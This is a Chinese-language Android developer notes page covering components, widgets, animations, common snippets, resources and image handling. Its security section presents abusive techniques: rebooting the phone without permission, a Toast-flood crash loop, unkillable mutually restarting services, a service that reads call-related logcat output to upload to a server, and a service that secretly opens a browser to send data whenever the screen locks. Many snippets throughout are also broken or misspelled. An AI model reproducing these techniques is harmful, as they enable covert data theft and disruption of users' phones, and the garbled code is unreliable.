---
layout: default
category: Android
title: "Android"
description: "Android记录"
tags: [android, abc]
navigation: [组件, 控件, 动画, 线程, 常用, 优化, 网络, 资料, 安全, 多媒体]
---

<section id="1">
  <div class="page-header">
    <h1>一、组件</h1>
  </div>

* *Activity* - 活动
** "Activity生命周期":http://developer.android.com/guide/components/activities.html#Lifecycle
** "PreferenceActivity的使用":android/PreferenceActivity.html

* *Service* - 服务
** "startService":android/startService.html
** "bindService":android/bindService.html
** "AIDL":android/AIDL.html - Android Interface Definition Language(接口描述语言，用于进程通信)
** "IntentService":android/IntentService.html - 异步服务，方便处理耗时任务

* *BroadcastReceiver* - 广播接收

* *ContentProvider* - 内容提供者

</section>

<section id="2">
  <div class="page-header">
    <h1>二、控件</h1>
  </div>

* "TextView":java.html - 文本
* "Menus":android/menu.html - 菜单（Options Menu、Context Menu、Submenu）
* "Dialogs":android/dialog.html - 对话框（AlertDialog、ProgressDialog、DatePickerDialog、TimePickerDialog）
* "Notifications":android/Notifications.html - 通知（Toast Notification、Status Bar Notification、Dialog Notification）
* "ViewFlipper":android/ViewFlipper.html - 视图切换
* "ViewPager":android/ViewPager.html
* "ExpandableListView":android/ExpandableListView.html - 折叠ListView
* "Custom Components":http://www.linguofeng.com - 自定义控件

</section>

<section id="3">
    <div class="page-header">
        <h1>三、动画</h1>
    </div>

* *Tween Animation*
** "平移":android/TranslateAnimation.html - TranslateAnimation
** "渐变":android/AlphaAnimation.html - AlphaAnimation
** "缩放":android/ScaleAnimation.html - ScaleAnimation
** "旋转":android/RotateAnimation.html - RotateAnimation

* *Frame Animation*
** "逐帧动画":android/AnimationDrawable.html - AnimationDrawable
</section>

<section id="4">
    <div class="page-header">
        <h1>四、线程</h1>
    </div>

* "AsyncTask 异步任务":android/AsyncTask.html
</section>


<section id="5">
    <div class="page-header">
        <h1>五、常用</h1>
    </div>
* *获取当前系统版本号*


pre. android.os.Build.VERSION.SDK_INT

* *横屏显示*


pre. <activity android:screenOrientation="landscape"

* *全屏无标题栏显示*


pre. <application android:theme="@android:style/Theme.Black.NoTitleBar.Fullscreen"

* *无标题栏显示*

<pre class="prettyprint">
<!-- XML实现 -->
<application android:theme="@android:style/Theme.Black.NoTitleBar" />
</pre>

<pre class="prettyprint">
// JAVA实现
requestWindowFeature(Window.FEATURE_NO_TITLE);
</pre>

* *自定义标题栏布局*

<pre class="prettyprint">
// 1.Activity：
// 声明使用自定义标题
requestWindowFeature(Window.FEATURE_CUSTOM_TITLE);
setContentView(R.layout.main);
// 自定义标题栏布局
getWindow().setFeatureInt(Window.FEATURE_CUSTOM_TITLE, R.layout.main_title);
</pre>

<pre class="prettyprint">
<!-- 2.XML：main_title.xml -->
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:orientation="horizontal" >

    <ImageView
        android:id="@+id/title_back"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_centerVertical="true"
        android:focusable="true"
        android:contentDescription="@string/app_name"
        android:src="@drawable/title_back_btn" />

    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_centerInParent="true"
        android:text="@string/app_name"
        android:textColor="#ff000000" />

    <ImageView
        android:id="@+id/title_reload"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_alignParentRight="true"
        android:layout_centerVertical="true"
        android:layout_marginRight="5.0px"
        android:focusable="true"
        android:contentDescription="@string/app_name"
        android:src="@drawable/title_new_btn" />

</RelativeLayout>
</pre>

* *自定义标题栏背景与高度* (上面只是自定义标题栏的而已，而背景与高度还是没有变化，接下来就要处理标题栏背景与高度)

<pre class="prettyprint">
<!-- 1.创建value/styles.xml文件 -->
<?xml version="1.0" encoding="UTF-8"?>
<resources>
    <style name="CustomWindowTitleBackground">
        <item name="android:background">@drawable/titlebar_bg_nor</item>
    </style>
    <style name="title" parent="@android:style/Theme">
        <item name="android:windowTitleSize">50.0dip</item>
        <item name="android:windowTitleBackgroundStyle">@style/CustomWindowTitleBackground</item>
    </style>
</resources>

<!-- 2.接着在清单文件中添加android:theme属性 -->
<activity android:name=".MainActivity" android:theme="@style/title" />
</pre>

* *ListView滚动加载更新数据*

<pre class="prettyprint linenums">
ListView.setOnScrollListener(new OnScrollListener() {
    // 滚动状态改变时执行
    public void onScrollStateChanged(AbsListView view, int scrollState) {
        // 停止滚动状态
        switch (scrollState) {
        case OnScrollListener.SCROLL_STATE_IDLE:
            // 判断滚动到底部
            // view.getLastVisiblePosition() 获得最后一条可见记录的下标位置（下标从1开始）
            if (view.getLastVisiblePosition() == (view.getCount() - 1)) {
                // TODO 滚动到底部时自动加载更多数据
            }
        break;
        }
    }
});
</pre>

* *异常处理* (提示用户把异常信息回馈给公司)

<pre class="prettyprint">
//==================================================================================
//= 1.实现UncaughtExceptionHandler接口
//==================================================================================
class ExceptionHandler implements UncaughtExceptionHandler {
    private static ExceptionHandler exceptionHandler;
    
    // 私有构造方法
    private ExceptionHandler(){}
    
    // 单态
    public synchronized static ExceptionHandler getInstance(){
        if(exceptionHandler == null)
            exceptionHandler = new ExceptionHandler();
        return exceptionHandler;
    }
    
    // 实现该方法
    public void uncaughtException(){
        // TODO 能够捕获到所有异常
        
        // 获取手机硬件信息（通过反射）
        Fields[] fields = Build.class.getDeclaredFields();
        for(Field field : fields) {
            // 暴力反射
            field.setAccessible(true);
            String name = field.getName();
            // 静态字段值
            String value = field.get(null).toString();
            // TODO 把获取的手机信息拼装起来
        }
        
        // 获取当前程序的版本
        String version = Context.getPackageManager().getPackageInfo(Context.getPackageName(), 0).versionName;
        
        // 获取异常信息
        Writer w = new StringWriter();
        printWriter writer = new PirntWriter(w);
        ex.printStackTrace(writer);
        writer.flush();
        writer.close();
        
        String error = writer.toString();
        
        // TODO 把上面获取到的信息提交到服务器
        
        // 退出程序(根据需求需要延迟杀死进程)
        android.os.Process.killProcess(android.os.Process.myPid());
    }
}
</pre>

<pre class="prettyprint">
 //=================================================================================
//= 2.让应用统一使用自定义的异常处理类
//==================================================================================
public class App extends Application {
    public void onCreate(){
        ExceptionHandler handler = ExceptionHandler.getInstance();
        // 把异常处理设置到主线程中
        Thread.setDefaultUncaughtExceptionHandler(handler);
    }
}
</pre>

* *在子线程中使用主线程的消息队列*

<pre class="prettyprint">
// 创建消息队列
Looper.prepare();
// 在消息队列中执行
Toase.makeText(this, "我是在子线程中利用Looper消息队列实现显示", 0).show();
// 进入消息循环
Looper.loop();
</pre>

* *获取应用版本号并在线更新应用*

<pre class="prettyprint">
PackageInfo pi = Context.getPackageManager().getPackageInfo(Context.getPackageName(), 0);
// 版本
pi.versionName;
</pre>

* *杀死后台进程*

<pre class="prettyprint">
// 如果系统版本小于2.2的话
if (android.os.Build.VERSION.SDK_INT < 8) {  
    actMag.restartPackage("packageName");  
} else {  
    actMag.killBackgroundProcesses("packageName");  
} 
</pre>

* *发短信/彩信*

<pre class="prettyprint">
// 标准
SmsManager smsManager = SmsManager.getDefault();
String message = "短信内容，有可能超过70个字符";
PendingIntent sentIntent = PendingIntent.getBroadcast(getApplicationContext(), 0, new Intent(), 0);

if (message > 70) {
    // 截断70字一条
    List<String> msgs = smsManager.divideMessage(message);
    for (String msg : msgs) {
        smsManager.sendTextMessage("对方电话号码", null, msg, sentIntent, null);
    }
} else {
    smsManager.sendTextMessage("对方电话号码", null, message, sentIntent, null);
}
</pre>

* *Intent用法全面总结*

** "Intent用法全面总结":android/Intent.html

* *判断sdcard是否存在*

<pre class="prettyprint">
public boolean isSdCardExists() { 
    if (Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED)) { 
        return true; 
    } else { 
        return false; 
    }
}
</pre>

* *判断某个服务是否正在运行*

<pre class="prettyprint">
public boolean isServiceRunning(String serviceName) { 
    ActivityManager manager = (ActivityManager) ctx.getSystemService(Context.ACTIVITY_SERVICE); 
    for (RunningServiceInfo svc : manager.getRunningServices(Integer.MAX_VALUE)) { 
        if (svc.service.getClassName().equals(serviceName)) { 
            return true; 
        } 
    }
    return false; 
}
</pre>

* *获取已安装的软件信息*

<pre class="prettyprint">
public List<HashMap<String, Object>> getInstalledApps() { 
    List<ApplicationInfo> pkgs = ctx.getPackageManager().getInstalledApplications(0); 
    
    HashMap<String, Object> map; 
    List<HashMap<String, Object>> list = new ArrayList<HashMap<String, Object>>(); 
    
    Iterator<ApplicationInfo> i = pkgs.iterator(); 
    while (i.hasNext()) { 
        ApplicationInfo app = i.next(); 
        String pkgName = app.packageName; 
        String label = ""; 
        try { 
            label = ctx.getPackageManager().getApplicationLabel(app).toString(); 
        } catch (Exception e) { 
            Log.e(tag, "setLabel is error. " + e.getMessage()); 
        } 
        map = new HashMap<String, Object>(); 
        map.put("name", label); 
        map.put("desc", pkgName); 
        list.add(map);
    }
    return list; 
}
</pre>

* *隐藏键盘*

<pre class="prettyprint">
InputMethodManager imm = ((InputMethodManager)getSystemService(Context.INPUT_METHOD_SERVICE));
imm.hideSoftInputFromWindow(this.getCurrentFocus().getWindowToken(),InputMethodManager.HIDE_NOT_ALWAYS);
</pre>
</section>

<section id="6">
    <div class="page-header">
        <h1>六、优化</h1>
    </div>

* *ListView优化*

<pre class="prettyprint">
class ViewHolder{
    TextView mTextView;
}

public View getView(...){
    if(convertView == null){
        convertView = Layou...;
        convertView.setTag(new ViewHolder());
    }
    
    ViewHolder viewHolder = (ViewHolder)convertView.getTag();
    viewHolder.mTextView = convertView.findById...;
}
</pre>

* *图片缓存* 软引用办法实现缓存

<pre class="prettyprint">
// 集合
Map<String, SoftReference<Bitmap>> imageCache = new HashMap<String, SoftReference<Bitmap>>();

// 取
if (imageCache.containsKey(imageUrl)) {
    Bitmap bitmap = imageCache.get(imageUrl).get();
}

// 存
imageCache.put(imageUrl, new SoftReference<Drawable>(bitmap));
</pre>

* *使用线程池优化性能*

** "ThreadPool":android/ThreadPool.html

* *完成退出程序*

** "完成退出程序":android/exitApplication.html
</section>

<section id="7">
    <div class="page-header">
        <h1>七、网络编程</h1>
    </div>

* *URL* & *URLConnection* （常用于下载文件）
** 下载文件

* *HttpURLConnection* （POST请求时参数是以流的形式发送给服务器）
** GET
** POST

* *HttpClient*
** GET
** POST
** 上传文件

* *AndroidHttpClient*

* *Socket* （TCP & UDP）
</section>

<section id="8">
    <div class="page-header">
        <h1>八、资源</h1>
    </div>

* *drawable*

<pre class="prettyprint">
<!-- XML中使用该类型资源 -->
<ImageView android:src="@drawable/icon" />
</pre>

<pre class="prettyprint">
// java中使用该类型资源
Drawable icon = getResources().getDrawable(R.drawable.icon);
</pre>

* *values*

<pre class="prettyprint">
<!-- XML中使用该类型资源 -->
<TextView android:text="@string/text" />
</pre>

<pre class="prettyprint">
// java中使用该类型资源

// 对应：<string name="text">xxx</string>
String text = getResources().getString(R.string.text);

// 对应：<string-array name="texts"><item>xxx</item></string-array>
String[] texts = getResources().getStringArray(R.array.texts);

// 对应：<color name="black">#000000</color>
int color = getResources().getColor(R.color.black);
</pre>

* *raw*

<pre class="prettyprint">
InputStream in = getResources().openRawResource(R.raw.test);
</pre>

* *assets*

<pre class="prettyprint">
AssetManager assetManager = getResources().getAssets();
InputStream is = assetManager.open("文件名", MODE_APPEND);
</pre>
</section>

<section id="9">
    <div class="page-header">
        <h1>九、安全专题</h1>
    </div>

* *基本介绍*

** *AndroidManifest.xml*

*** 作用1：声明包名且唯一
*** 作用2：声明程序的组件
*** 作用3：声明程序的权限
** *Activity*

*** 作用1：与用户交互的界面
*** 作用2：一个View容器
*** 作用3：受ActivityManager管理，维护Activity的task栈
*** 作用4：启动的4种模式
*** 作用5：可以被另的应用程序启动
*** 作用6：运行在当前程序的进程中
*** 作用7：可以添加权限
** *Intent* （意图）

*** 作用1：描述一个操作
*** 作用2：简单IPC的实现（进程间通信）
*** 作用3：传递数据
*** 作用4：激活3大组件（Activity，Service，Broadcast）
** *Broadcast Receiver* （广播）

*** 作用1：接受广播的intent
*** 作用2：在清单文件中注册
*** 作用3：无序广播（异步），不可被终止
*** 作用4：有序广播（同步），可以被终止
** *Service*  （服务）

*** 作用1：后台运行的组件
*** 作用2： 默认不在单独进程中
*** 作用3：运行在主线程中
*** 作用4：没有界面的Activity

* *沙箱机制*


<pre>
就是签名与权限的验证机制，只要遵守这个机制就可以超越一些安全防锁，但很麻烦
</pre>

* *0权限重启手机*


<pre class="prettyprint">
// 0权限重启手机
Intent intent = new Intent(Intent.ACTION_REBOOT);
// 重启等待时间
intent.putExtra("nowait", 1);
// 重启的次数
intent.putExtra("interval", 1);
intent.putExtra("window", 0);
sendBroadcast(intent);

// 提升应用为系统程序（需要签名与系统签名一致，用到signapk.jar工具）
<manifest ...
    android:sharedUserId="android.uid.system"
    
// java -jar signapk.jar platform.x509.pem platform.pk8 原.apk 后.apk
</pre>

<pre class="prettyprint">
// 0权限重启手机（JNI版：Toast底层就是使用JNI）
while(true){
    Toast toast = new Toast(this);
    // 不显示Toast的内容
    toast.setView(new View(this)); 
    toast.show();
}
</pre>

* *0权限开机启动* （Android系统漏洞）


<pre class="prettyprint">
<!-- BootCompleteReceiver需要继承BroadcastReceiver -->
<receiver android:name=".BootCompleteReceiver">
    <intent-filter>
        <action android:name="android.intent.action.BOOT_COMPLETED" />
    </intent-filter>
</receiver>

<!-- 权限可以不添加 -->
<!-- uses-permission / -->
</pre>

<pre class="prettyprint">
public class BootCompleteReceiver extends BroadcastReceiver {
    public void onReceive(Context context, Intent intent) {
        
    }
}
</pre>

* *流氓服务* （不死的服务）


<pre>
原理：在服务1被结束时启动服务2，在服务2结束时启动服务1，如此交替。
</pre>

* *隐私* （Logcat大法：adb logcat -b xxx）

** Main     /dev/log/main
** Events   /dev/log/events
** Radio    /dev/log/radio
** System   /dev/log/system

* *Logcat实操* 目的：通过服务获取手机的所有日志并上传到服务器


<pre class="prettyprint">
public class ReadLogService extends Service {

    public IBinder onBind(Intext intext) {
        return null;
    }
    
    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);
        // 开启线程读取日志（需要相关READ_LOGS权限）
        new Thread(new ReadLogTask()).start();
    }
    
    private class ReadLogTask implements Runnable {
        public void run() {
            // logcat -b main
            // logcat -b events     操作相关的日志
            // logcat -b radio      通话相关的日志
            // logcat -b system
            Process process = Runtime.getRunntime().exec("logcat -b radio");
            InputStream is = process.getInputStream();
            ByfferedReader br = new BufferedRead(new InputStreamReader(is));
            
            // TODO 把br流写到一个文件里或上传到服务器
        }
    }
}
</pre>

* *0权限访问网络* （上传）


<pre class="prettyprint">
public class ViewWebService extends Service {
    ScreenOFFBroadcastReceiver off;
    ScreenONBroadcastReceiver on;
    KeyGuardManager mKeyGuardManager;

    public IBinder onBind(Intext intext) {
        return null;
    }
    
    // 监听锁屏广播
    class ScreenOFFBroadcastReceiver extends BroadcastReceiver {
        public void onReceive(Context context, Intent intent) {
            // TODO 上传数据
            handler.postDelayed(r, 500);
        }
    }
    
    // 监听开屏广播
    class ScreenONBroadcastReceiver extends BroadcastReceiver {
        public void onReceive(Context context, Intent intent) {
            // TODO 停止上传
            handler.removeCallbacks(r);
            
            // 模拟HOME键退出浏览器（需要借助一个Activity实现）
            // dispatchKeyEvent(new KeyEvent(KeyEvent.ACTION_DOWN, KeyEvent.ACTION_HOME));
            Intent intent = new Intent();
            intent.addAction(Intent.ACTION_VIEW);
            intent.addCategory(Intent.CATEGORY_HOME);
            startActivity(intent);
        }
    }
    
    public void onCreate() {
        super.onCreate();
        
        //
        mKeyGuardManager = (KeyGuardManager)getSystemService(KEYGUARD_SERVICE);
        
        off = new ScreenOFFBroadcastReceiver();
        on = new ScreenONBroadcastReceiver();
        
        // 注册锁屏广播
        IntentFilter ifOFF = new IntentFilter(android.intent.action.SCREEN_OFF);
        registerReceiver(off, ifOFF);

        // 注册开屏广播
        IntentFilter ifON = new IntentFilter(android.intent.action.SCREEN_ON);
        registerReceiver(on, ifON);
    }
    
    Handler handler = new Handler();
    
    private Runnable r = new Runnable() {
        public void run() {
            // 锁屏状态
            if(mKeyGuardManager.inKeyguardRestrictedInputMode()) {
                Intent intent = new Intent(Intent.ACTION_VIEW);
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                intent.setData(Uri.parse("http://10.0.2.2/test.action?name=android"));
                startActivity(intent);

                // 重复发送
                handler.postDelayed(r, 500);
            }
        }
    };
}
</pre>
</section>

<section id="10">
    <div class="page-header">
        <h1>十、多媒体</h1>
    </div>

* *从相册中获取图片*

<pre class="prettyprint">
// 打开相册的意图
Intent intent = new Intent(Intent.ACTION_PICK);
intent.setType("image/*");
startActivityForResult(intent, 0);

public void onActivityResult(...) {
    Uri uri = data.getData();
    BitmapFactory.Options bfo = new BitmapFactory.Options();
    bfo.inSampleSize = 8;
    InputStream is = getContentResoler().openInputStream(uri);
    Bitmap bitmap = BitmapFactory.decodeFile(is, bfo);
}
</pre>

* *从相册中获取图片并按屏幕大小比例缩放显示*

<pre class="prettyprint">
// 获取屏幕宽高
Display display = getWindowManager().getDefaultDisplay();
display.getWidth();
display.getHeight();

BitmapFactory.Options bfo = new BitmapFactory.Options();
bfo.inJustDecodeBounds = true;
BitmapFactory.decodeFile("图片路径", bfo);
Math.deil(bfo.outHeight / display.getHeight());
Math.deil(bfo.outWidth / display.getWidth());
</pre>

* *获取图片Exif信息*

<pre class="prettyprint">
ExifInterface exif = ExifInterface("图片路径");
// 获取
exif.getAttribute(ExifInterface.对应的常量);
// 设置
exif.setAttribute(ExifInterface.对应的常量, "值");
</pre>

* *创建Bitmap拷贝*

<pre class="prettyprint">
// 原图
Bitmap source = BitmapFactory...
//创建空白的Bitmap： 宽、高、原图的配置属性
Bitmap bitmap = Bitmap.createBitmap(width, height, source.getConfig());
// 画布
Canvas canvas = new Canvas(bitmap);
// 画笔
Paint paint = new Paint();
// 举正
Matrix matrix = new Matrix();
// 把原图画到bitmap中
canvas.drawBitmap(source, matrix, paint);
// 拷贝
Btimap bak = bitmap;
</pre>

* *图形缩放（Scale）、旋转（Rotate）、平移（Translate）*

<pre>
Matrix类的使用
</pre>

* *颜色处理*

<pre class="prettyprint">
// ColorMatrix类的使用
ColorMatrix.set(new float[]{
    1,0,0,0,0
    0,1,0,0,0
    0,0,1,0,0
    0,0,0,1,0
    
    // 计算公式
    // 红：  1*128 + 0*128 + 0...
    // 绿：  0*128 + 1*128 + 0...
    // 蓝：  0*128 + 0*128 + 1...
    // 透明：0*128 + 0*128 + 0...
});
</pre>

* *图片合成*

<pre class="prettyprint">
// 混合模式PorterDuffXfermode
Paint.setXfermode(new PorterDuffXfermode(android.graphics.PorterDuff.Mode.MULTIPLY));
</pre>

* *Path路径文字* 弧度

<pre class="prettyprint">
// Path类与Canvas.drawTextOnPath()方法的使用

// 模拟SD卡被装载的广播
//new Intent(ACTION_MEDIA_MOUNTED, Uri.aprse("file:///"));
</pre>

* *人脸识别*

<pre class="prettyprint">
// 人脸识别
// FaceDetector类的使用
</pre>
</section>
